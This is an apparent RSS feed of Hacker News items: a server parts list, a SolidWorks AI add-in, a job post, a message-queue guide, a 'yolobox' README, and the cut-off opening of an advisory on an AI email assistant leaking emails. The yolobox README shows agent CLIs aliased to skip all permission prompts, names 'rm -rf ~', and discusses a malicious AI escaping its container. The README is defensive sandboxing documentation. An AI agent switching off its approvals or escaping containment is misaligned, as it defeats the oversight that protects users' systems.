    &lt;p&gt;In the next post, I want to share implementation details and more benchmark results of the SCION OSS AF_XDP underlay, so stay tuned!&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Component&lt;/cell&gt;
        &lt;cell role="head"&gt;Quantity&lt;/cell&gt;
        &lt;cell role="head"&gt;Retailer&lt;/cell&gt;
        &lt;cell role="head"&gt;Price&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;ASUS Pro WS W790E-SAGE SE (LGA4677, Intel W790, SSI EEB)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;digitec.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 962.90&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Intel Xeon W5-2455X (3.2 GHz, 12-core)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;galaxus.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 1106.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Corsair DDR5 RDIMM 64 GB (4×16 GB, 5600 MT/s, ECC)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;galaxus.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 536.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Corsair RM850e (850 W)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;galaxus.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 113.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Samsung 990 Pro w/ Heatsink (1 TB, M.2 2280)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;digitec.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 101.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Noctua NH-U14S DX-4677 CPU cooler&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;digitec.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 132.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Phanteks Enthoo Pro II Server Edition TG (SSI-EEB)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;galaxus.ch&lt;/cell&gt;
        &lt;cell&gt;~CHF 170.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Noctua NF-A14 PWM (140 mm)&lt;/cell&gt;
        &lt;cell&gt;6&lt;/cell&gt;
        &lt;cell&gt;digitec.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 149.40&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Noctua NF-A12x25 G2 PWM Sx2-PP (120 mm, 2-pack)&lt;/cell&gt;
        &lt;cell&gt;1 (2 fans)&lt;/cell&gt;
        &lt;cell&gt;digitec.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 64.90&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Noctua NF-A12x25 G2 PWM (120 mm)&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;digitec.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 34.90&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Mellanox/NVIDIA BlueField-2 BF2H532C dual-port 25G (PCIe 4.0 x8)&lt;/cell&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;piospartslap.de&lt;/cell&gt;
        &lt;cell&gt;289,92 €&lt;p&gt;+ 49,99 € shipping&lt;/p&gt;&lt;p&gt;(CHF 318.09)&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;25G SFP28 passive DAC cable 0.5 m&lt;/cell&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;ricardo.ch&lt;/cell&gt;
        &lt;cell&gt;CHF 51.15&lt;p&gt;+ CHF 2.00 shipping&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Grand Total&lt;/cell&gt;
        &lt;cell&gt;CHF 3,741.34&lt;p&gt;(≈$4,700 USD)&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46590541</guid><pubDate>Mon, 12 Jan 2026 16:20:16 +0000</pubDate></item><item><title>Show HN: AI in SolidWorks</title><link>https://www.trylad.com</link><description>&lt;doc fingerprint="b3c6fa5900f7aa44"&gt;
  &lt;main&gt;
    &lt;p&gt;1.1.0&lt;/p&gt;
    &lt;p&gt;01-11-2026&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Add planning mode&lt;/item&gt;
      &lt;item&gt;Add macro writing/running&lt;/item&gt;
      &lt;item&gt;Detect and report sketch issues&lt;/item&gt;
      &lt;item&gt;Improve caching efficiency&lt;/item&gt;
      &lt;item&gt;Various AI context improvements and bug fixes&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;LAD (Language-Aided Designer)&lt;/p&gt;
    &lt;p&gt;A SolidWorks add-in to design with natural language using AI&lt;/p&gt;
    &lt;p&gt;Describe your design in plain language and LAD will translate it into SolidWorks operations, creating sketches, features, and assemblies all through natural conversation. LAD uses screenshots and the feature tree to understand your model's current state, verifying operations were completed correctly and correcting mistakes.&lt;/p&gt;
    &lt;p&gt;Design from Documentation and Images&lt;/p&gt;
    &lt;p&gt;Provide documentation files, images, or examples of previous parts and assemblies, and LAD will intelligently read and use them.&lt;/p&gt;
    &lt;p&gt;Write and Run Macros&lt;/p&gt;
    &lt;p&gt;LAD can write and run VBA macros for reproducibility and niche functionality not covered by standard LAD tools. When writing macros, LAD searches SolidWorks documentation and examples to better understand the API.&lt;/p&gt;
    &lt;p&gt;Permissioning and Versioning&lt;/p&gt;
    &lt;p&gt;LAD stores checkpoints so you can revert unwanted changes, lets you control which commands run automatically, and uses rules you provide to guide the AI as it works.&lt;/p&gt;
    &lt;p&gt;LAD (Language-Aided Designer) is a system that integrates directly into SolidWorks as an Add-in and can create sketches, features, macros, and other CAD objects.&lt;/p&gt;
    &lt;p&gt;1.1.0&lt;/p&gt;
    &lt;p&gt;01-11-2026&lt;/p&gt;
    &lt;p&gt;1.0.0&lt;/p&gt;
    &lt;p&gt;01-05-2026&lt;/p&gt;
    &lt;p&gt;Try LAD now.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46591100</guid><pubDate>Mon, 12 Jan 2026 16:56:17 +0000</pubDate></item><item><title>Carma (YC W24 clients, A in 6mo) Eng hiring: Replace $500B human fleet ops with AI</title><link>https://news.ycombinator.com/item?id=46591170</link><description>&lt;doc fingerprint="b98cc6fbbd9605ac"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;TL;DR: Live product used daily by Fortune 500 clients; post-revenue, real operations, solving a real problem today. We are growing fast, hiring founding engineers, $200K+ cash base + 3.00%+ equity, build with us in-person in SF.&lt;/p&gt;
      &lt;p&gt;We’re building an AI platform that makes fleet operations — maintenance, repairs, approvals, pricing — fully autonomous. This massive $500B industry still runs on phone calls, PDFs, and spreadsheets.&lt;/p&gt;
      &lt;p&gt;Today: - Live product already used by multiple Fortune 500 clients nationwide&lt;/p&gt;
      &lt;p&gt;- Signing new enterprise clients every month&lt;/p&gt;
      &lt;p&gt;- $5.5M seed raised, Series A on track in mid-2026&lt;/p&gt;
      &lt;p&gt;- Your code runs in live fleet ops and gets same-day feedback&lt;/p&gt;
      &lt;p&gt;Stack: React, NestJS, PostgreSQL, AWS Location: On-site, San Francisco&lt;/p&gt;
      &lt;p&gt;Roles: Founding Head of Engineering Comp: $250K + 5% equity https://www.ycombinator.com/companies/carma/jobs/5Mwg4jp-fou...&lt;/p&gt;
      &lt;p&gt;Founding Full-Stack Engineer Comp: $200K + 3% equity https://www.ycombinator.com/companies/carma/jobs/YLaym2M-fou...&lt;/p&gt;
      &lt;p&gt;If you want: real % ownership, work w/ a top 0.1% business team (all STEM degrees) closing brand-name clients nonstop who use what you build every day, and experience real PMF — this is one of those rare early roles.&lt;/p&gt;
      &lt;p&gt;Interested? Let's chat ASAP. Apply above or email me directly: muhammad at joincarma.com&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46591170</guid><pubDate>Mon, 12 Jan 2026 17:00:48 +0000</pubDate></item><item><title>Message Queues: A Simple Guide with Analogies (2024)</title><link>https://www.cloudamqp.com/blog/message-queues-exaplined-with-analogies.html</link><description>&lt;doc fingerprint="e71cd8526aa188cb"&gt;
  &lt;main&gt;
    &lt;p&gt;I find stories and analogies very fascinating and — to explain message queues in a super approachable way, we will use some analogies: databases, warehouses and post offices.&lt;/p&gt;
    &lt;p&gt;Stay with me …&lt;/p&gt;
    &lt;p&gt;Databases are primarily used for data persistence — think Postgres or MongoDB. Like databases, message queues also perform some storage function. But why use message queues for data storage when there are databases? Think of databases and message queues in terms of warehouses and post offices.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Databases are like warehouses - they are designed to hold a lot of different things, most times, over a long period of time.&lt;/item&gt;
      &lt;item&gt;Message queues on the other hand are like post offices — Where letters and packages stop briefly on their way to being delivered. The packages don't stay there long; they're just sorted and sent off to where they need to go.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Essentially, databases are primarily designed for scenarios where you need to store and manage some state over a long period of time. In contrast, you would want to use a message queue for data that you do not want to keep around for very long— A message queue holds information just long enough to send it to the next stop.&lt;/p&gt;
    &lt;p&gt;If you look at message queues from this post office perspective, then you will begin to appreciate the fact that a message queue is simply a medium through which data flows from a source system to a destination system.&lt;/p&gt;
    &lt;p&gt;Looking at message queues as medium of communication is just one perspective, but it’s sufficient to help you get started with message queues — Let’s double down on that perspective.&lt;/p&gt;
    &lt;p&gt;A message queue is a technology that simply receives data, formally called messages in the message queueing world from a source system(s) (producer), lines up these messages in the order they arrive, then sends each message to some final destination, usually another system called the consumer.&lt;/p&gt;
    &lt;p&gt;Note that both the producer and consumer could also just be modules in the same application.&lt;/p&gt;
    &lt;p&gt;Now that we understand the core essence of message queues, let’s explore how they work.&lt;/p&gt;
    &lt;head rend="h2"&gt;How a Message Queue Works&lt;/head&gt;
    &lt;p&gt;Typically, producers and consumers would connect and communicate with a message queue via some protocol that the message queue supports.&lt;/p&gt;
    &lt;p&gt;In other words, a message queue would implement a protocol or some set of protocols. To communicate with a message queue, a producer or consumer would leverage some client library that also implements the protocol or one of the protocols supported by the broker.&lt;/p&gt;
    &lt;p&gt;Most message brokers commonly implement at least one of these protocols : AMQP, MQTT and STOMP. You can learn more about these protocols in our AMQP vs MQTT guide or the AMQP, MQTT and STOMP guide.&lt;/p&gt;
    &lt;head rend="h2"&gt;When to Use a Message Queue&lt;/head&gt;
    &lt;p&gt;We’ve already seen how message queues allow messages to flow from a source system to a destination system. This inherent nature of message queues makes them perfect for communication between systems in a microservice architecture.&lt;/p&gt;
    &lt;p&gt;What is the microservice architecture? Again, let’s start with something you are familiar with — Monoliths.&lt;/p&gt;
    &lt;p&gt;A monolith is characterized by the entire codebase being inside one application. This is a great approach for smaller projects, and many new applications start out as a monolith. This is because on a smaller monoliths are faster to develop, easier to test, and easier to deploy.&lt;/p&gt;
    &lt;p&gt;However when an application starts to grow, the more problems you will see with this architecture. Even with a structured approach, the code often starts to feel messy and the development experience becomes inconvenient. Changes become more difficult to implement, and the risk of introducing bugs is higher.&lt;/p&gt;
    &lt;p&gt;Many times the solution to these problems is to break up your monolith application into microservices. And microservices are smaller, more modular services that focus on a single area of responsibility.&lt;/p&gt;
    &lt;p&gt;The microservice approach has some benefits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;With microservices, there is fault isolation— if one service is buggy, that bug is isolated to just that service. This in turn makes your application more reliable compared to a monolith where a single component error could take down the entire application.&lt;/item&gt;
      &lt;item&gt;There is also the opportunity of being able to diversify the technology stack from service to service, which helps you optimize your services for its purpose. For example, a performance critical service has the chance to make certain performance trade-offs, without putting limits to the rest of the services.&lt;/item&gt;
      &lt;item&gt;Naturally, scaling becomes much easier because you can just scale one of your services instead of scaling the entire application and save a lot of resources.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Now that we understand what microservices are, let’s cycle back to: Using message queues for communication between systems in a microservice architecture.&lt;/p&gt;
    &lt;p&gt;But before we get to that, note that message queueing isn’t the only way to get services to communicate — There is one other common way:&lt;/p&gt;
    &lt;p&gt;Synchronous communication, where network requests are sent directly from one service to another via REST API calls, for example. Service A will initiate a request and then wait for Service B to finish handling the request and send a response back before it continues on with the activity it was doing.&lt;/p&gt;
    &lt;p&gt;With message queueing, the communication is asynchronous — In this case, Service A can send messages to a message broker and instead of waiting for Service B, it will receive a super quick acknowledgement back from the broker and then it can carry on doing what it was doing while Service B fetches the message from the queue and handles it.&lt;/p&gt;
    &lt;p&gt;This will save your service from overloading if there is a suddenly increased workload, instead the messages are buffered by the queue and your services can just handle them when they have the capacity.&lt;/p&gt;
    &lt;p&gt;There you have it, a very gentle introduction to message queues. Now, let’s do a recap.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;In summary, message queues are like post offices for your data, moving messages from one place to another. They work by receiving messages from producers, lining them up in the order they arrive, and sending them to consumers. This makes them perfect for situations where systems need to communicate without waiting— think microservice architectures.&lt;/p&gt;
    &lt;p&gt;Understanding how message queues work and when to use them can help you build more reliable and scalable applications.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46591402</guid><pubDate>Mon, 12 Jan 2026 17:17:09 +0000</pubDate></item><item><title>Postal Arbitrage</title><link>https://walzr.com/postal-arbitrage</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46591708</guid><pubDate>Mon, 12 Jan 2026 17:41:50 +0000</pubDate></item><item><title>Show HN: Yolobox – Run AI coding agents with full sudo without nuking home dir</title><link>https://github.com/finbarr/yolobox</link><description>&lt;doc fingerprint="24165c5c91e5fbae"&gt;
  &lt;main&gt;
    &lt;code&gt;██╗   ██╗ ██████╗ ██╗      ██████╗ ██████╗  ██████╗ ██╗  ██╗
╚██╗ ██╔╝██╔═══██╗██║     ██╔═══██╗██╔══██╗██╔═══██╗╚██╗██╔╝
 ╚████╔╝ ██║   ██║██║     ██║   ██║██████╔╝██║   ██║ ╚███╔╝
  ╚██╔╝  ██║   ██║██║     ██║   ██║██╔══██╗██║   ██║ ██╔██╗
   ██║   ╚██████╔╝███████╗╚██████╔╝██████╔╝╚██████╔╝██╔╝ ██╗
   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
&lt;/code&gt;
    &lt;p&gt;Let your AI go full send. Your home directory stays home.&lt;/p&gt;
    &lt;p&gt;Run Claude Code, Codex, or any AI coding agent in "yolo mode" without nuking your home directory.&lt;/p&gt;
    &lt;p&gt;AI coding agents are incredibly powerful when you let them run commands without asking permission. But one misinterpreted prompt and &lt;code&gt;rm -rf ~&lt;/code&gt; later, you're restoring from backup (yea right, as if you have backups lol).&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;yolobox&lt;/code&gt; runs your AI agent inside a container where:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;✅ Your project directory is mounted at &lt;code&gt;/workspace&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;✅ The agent has full permissions and sudo inside the container&lt;/item&gt;
      &lt;item&gt;✅ Your home directory is NOT mounted (unless you explicitly opt in)&lt;/item&gt;
      &lt;item&gt;✅ Persistent volumes keep tools and configs across sessions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The AI can go absolutely wild inside the sandbox. Your actual home directory? Untouchable.&lt;/p&gt;
    &lt;code&gt;# Install (requires Go)
curl -fsSL https://raw.githubusercontent.com/finbarr/yolobox/master/install.sh | bash

# Or clone and build
git clone https://github.com/finbarr/yolobox.git
cd yolobox
make install&lt;/code&gt;
    &lt;p&gt;Then from any project:&lt;/p&gt;
    &lt;code&gt;cd /path/to/your/project
yolobox&lt;/code&gt;
    &lt;p&gt;You're now in a sandboxed shell. Run &lt;code&gt;claude&lt;/code&gt; and let it rip.&lt;/p&gt;
    &lt;p&gt;The base image comes batteries-included:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AI CLIs: Claude Code, Gemini CLI, OpenAI Codex (all aliased to run in full-auto mode!)&lt;/item&gt;
      &lt;item&gt;Node.js 22 + npm/yarn/pnpm&lt;/item&gt;
      &lt;item&gt;Python 3 + pip + venv&lt;/item&gt;
      &lt;item&gt;Build tools: make, cmake, gcc&lt;/item&gt;
      &lt;item&gt;Git + GitHub CLI&lt;/item&gt;
      &lt;item&gt;Common utilities: ripgrep, fd, fzf, jq, vim&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Need something else? You have sudo.&lt;/p&gt;
    &lt;p&gt;Inside yolobox, the AI CLIs are aliased to skip all permission prompts:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Command&lt;/cell&gt;
        &lt;cell role="head"&gt;Expands to&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;claude&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;claude --dangerously-skip-permissions&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;codex&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;codex --dangerously-bypass-approvals-and-sandbox&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;gemini&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;gemini --yolo&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;No confirmations, no guardrails—just pure unfiltered AI, the way nature intended.&lt;/p&gt;
    &lt;code&gt;yolobox                     # Drop into interactive shell
yolobox run &amp;lt;cmd...&amp;gt;        # Run a single command
yolobox run claude          # Run Claude Code in sandbox
yolobox upgrade             # Update binary and pull latest image
yolobox config              # Show resolved configuration
yolobox reset --force       # Delete volumes (fresh start)
yolobox version             # Show version
yolobox help                # Show help&lt;/code&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Flag&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--runtime &amp;lt;name&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Use &lt;code&gt;docker&lt;/code&gt; or &lt;code&gt;podman&lt;/code&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--image &amp;lt;name&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Custom base image&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--mount &amp;lt;src:dst&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Extra mount (repeatable)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--env &amp;lt;KEY=val&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Set environment variable (repeatable)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--ssh-agent&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Forward SSH agent socket&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--no-network&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Disable network access&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--readonly-project&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Mount project read-only (outputs go to &lt;code&gt;/output&lt;/code&gt;)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;--claude-config&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Copy host &lt;code&gt;~/.claude&lt;/code&gt; config into container&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;These are automatically passed into the container if set:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;ANTHROPIC_API_KEY&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;OPENAI_API_KEY&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;code&gt;GITHUB_TOKEN&lt;/code&gt;/&lt;code&gt;GH_TOKEN&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;OPENROUTER_API_KEY&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;GEMINI_API_KEY&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Create &lt;code&gt;~/.config/yolobox/config.toml&lt;/code&gt; for global defaults:&lt;/p&gt;
    &lt;code&gt;runtime = "docker"
image = "ghcr.io/finbarr/yolobox:latest"
ssh_agent = true&lt;/code&gt;
    &lt;p&gt;Or &lt;code&gt;.yolobox.toml&lt;/code&gt; in your project for project-specific settings:&lt;/p&gt;
    &lt;code&gt;mounts = ["../shared-libs:/libs:ro"]
env = ["DEBUG=1"]
no_network = true&lt;/code&gt;
    &lt;p&gt;Priority: CLI flags &amp;gt; project config &amp;gt; global config &amp;gt; defaults.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Note: Setting&lt;/p&gt;&lt;code&gt;claude_config = true&lt;/code&gt;in your config will copy your host's Claude config on every container start, overwriting any changes made inside the container. Use the CLI flag&lt;code&gt;--claude-config&lt;/code&gt;for one-time syncs.&lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS: Docker Desktop, OrbStack, or Colima&lt;/item&gt;
      &lt;item&gt;Linux: Docker or Podman&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;Memory: Claude Code needs 4GB+ RAM allocated to Docker. Colima defaults to 2GB which will cause OOM kills. Increase with:&lt;/p&gt;
      &lt;code&gt;colima stop &amp;amp;&amp;amp; colima start --memory 8&lt;/code&gt;
    &lt;/quote&gt;
    &lt;p&gt;yolobox uses container isolation (Docker or Podman) as its security boundary. When you run &lt;code&gt;yolobox&lt;/code&gt;, it:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Starts a container with your project mounted at &lt;code&gt;/workspace&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Runs as user &lt;code&gt;yolo&lt;/code&gt;with sudo access inside the container&lt;/item&gt;
      &lt;item&gt;Does NOT mount your home directory (unless explicitly requested)&lt;/item&gt;
      &lt;item&gt;Uses Linux namespaces to isolate the container's filesystem, process tree, and network&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The AI agent has full root access inside the container, but the container's view of the filesystem is restricted to what yolobox explicitly mounts.&lt;/p&gt;
    &lt;p&gt;The trust boundary is the container runtime (Docker/Podman). This means:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;✅ Protection against accidental &lt;code&gt;rm -rf ~&lt;/code&gt;or credential theft&lt;/item&gt;
      &lt;item&gt;✅ Protection against most filesystem-based attacks&lt;/item&gt;
      &lt;item&gt;&lt;g-emoji&gt;⚠️&lt;/g-emoji&gt;NOT protection against container escapes — a sufficiently advanced exploit targeting kernel vulnerabilities could break out&lt;/item&gt;
      &lt;item&gt;&lt;g-emoji&gt;⚠️&lt;/g-emoji&gt;NOT protection against a malicious AI deliberately trying to escape — this is defense against accidents, not adversarial attacks&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you're worried about an AI actively trying to escape containment, you need VM-level isolation (see "Hardening Options" below).&lt;/p&gt;
    &lt;p&gt;What yolobox protects:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Your home directory from accidental deletion&lt;/item&gt;
      &lt;item&gt;Your SSH keys, credentials, and dotfiles&lt;/item&gt;
      &lt;item&gt;Other projects on your machine&lt;/item&gt;
      &lt;item&gt;Host system files and configurations&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What yolobox does NOT protect:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Your project directory (it's mounted read-write by default)&lt;/item&gt;
      &lt;item&gt;Network access (use &lt;code&gt;--no-network&lt;/code&gt;to disable)&lt;/item&gt;
      &lt;item&gt;The container itself (the AI has root via sudo)&lt;/item&gt;
      &lt;item&gt;Against kernel exploits or container escape vulnerabilities&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Level 1: Basic (default)&lt;/p&gt;
    &lt;code&gt;yolobox  # Standard container isolation&lt;/code&gt;
    &lt;p&gt;Level 2: Reduced attack surface&lt;/p&gt;
    &lt;code&gt;yolobox run --no-network --readonly-project claude&lt;/code&gt;
    &lt;p&gt;Level 3: Rootless Podman (recommended for security-conscious users)&lt;/p&gt;
    &lt;code&gt;# Install podman and run rootless
yolobox --runtime podman&lt;/code&gt;
    &lt;p&gt;Rootless Podman runs the container without root privileges on the host, using user namespaces. This significantly reduces the impact of container escapes since the container's "root" maps to your unprivileged user on the host.&lt;/p&gt;
    &lt;p&gt;Level 4: VM isolation (maximum security)&lt;/p&gt;
    &lt;p&gt;For true isolation with no shared kernel, consider running yolobox inside a VM:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS: Use a Linux VM via UTM, Parallels, or Lima&lt;/item&gt;
      &lt;item&gt;Linux: Use a Podman machine or dedicated VM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This adds significant overhead but eliminates kernel-level attack surface.&lt;/p&gt;
    &lt;p&gt;For users who want to prevent container access to the local network while preserving internet access:&lt;/p&gt;
    &lt;code&gt;# Rootless podman uses slirp4netns by default, which provides
# network isolation from the host network
podman run --network=slirp4netns:allow_host_loopback=false ...&lt;/code&gt;
    &lt;p&gt;yolobox doesn't currently expose this as a flag, but you can achieve it by running rootless Podman (the default network mode for rootless is slirp4netns).&lt;/p&gt;
    &lt;code&gt;make image&lt;/code&gt;
    &lt;p&gt;This builds &lt;code&gt;yolobox/base:latest&lt;/code&gt; locally.&lt;/p&gt;
    &lt;p&gt;Because you want to tell your AI agent "just do it" without consequences. YOLO, but in a box.&lt;/p&gt;
    &lt;p&gt;MIT&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46592344</guid><pubDate>Mon, 12 Jan 2026 18:34:02 +0000</pubDate></item><item><title>Show HN: Fall asleep by watching JavaScript load</title><link>https://github.com/sarusso/bedtime</link><description>&lt;doc fingerprint="af7827771bac338b"&gt;
  &lt;main&gt;
    &lt;p&gt;This little toy project progressively tells a bedtime story about Liora and its little companion, while intentionally making a JavaScript loader spin for no reason other than to help you get to sleep.&lt;/p&gt;
    &lt;p&gt;As you go through the story, the time the loader spins increases while the speed at which the text appears decreases, so that you ideally never reach the end (unless you really, really want to).&lt;/p&gt;
    &lt;p&gt;I came up with this one night when I couldn’t fall asleep and was looking for some data analysis results on a web platform, noticing that the spinner was actually making me sleepy.&lt;/p&gt;
    &lt;p&gt;I am using it from time to time, and it helps a bit. So I decided to make it public. Here it is! You can try it directly at http://bedtime.my.&lt;/p&gt;
    &lt;p&gt;If you add it to your phone’s home screen, it should display fullscreen.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46592376</guid><pubDate>Mon, 12 Jan 2026 18:36:12 +0000</pubDate></item><item><title>Superhuman AI exfiltrates emails</title><link>https://www.promptarmor.com/resources/superhuman-ai-exfiltrates-emails</link><description>&lt;doc fingerprint="be0785995df2ff41"&gt;
  &lt;main&gt;
    &lt;p&gt;Threat Intelligence&lt;/p&gt;
    &lt;head rend="h1"&gt;Superhuman AI Exfiltrates Emails&lt;/head&gt;
    &lt;p&gt;Superhuman AI was able to exfiltrate sensitive emails from user accounts - without the user even being aware. This vulnerability was rapidly remediated by the Superhuman team.&lt;/p&gt;
